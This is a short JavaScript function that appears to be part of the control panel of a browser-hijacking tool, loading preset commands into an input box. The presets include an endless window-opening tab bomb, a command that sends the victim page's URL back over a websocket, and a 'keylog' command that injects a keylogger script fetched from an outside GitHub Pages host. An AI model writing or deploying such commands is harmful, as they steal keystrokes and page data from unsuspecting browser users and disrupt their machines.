function load(com) {
              if(com=="tab") {
                  document.getElementById("input").value="js:setInterval(function() {window.open()},0)"
              }
              if(com=="alert") {
                  document.getElementById("input").value="alert:"
              }
              if(com=="csa") {
                  document.getElementById("input").value="js:if(window.location.href==\'\') {alert();}"
              }
              if(com=="href") {
                  document.getElementById("input").value="js:ws.send('rsp:'+window.location.href);"
              }
              if(com=="keylog") {
                  document.getElementById("input").value="js:x=document.createElement('script');x.src='https://injection9.github.io/redJS/kl.js';document.body.append(x);"
              }
          }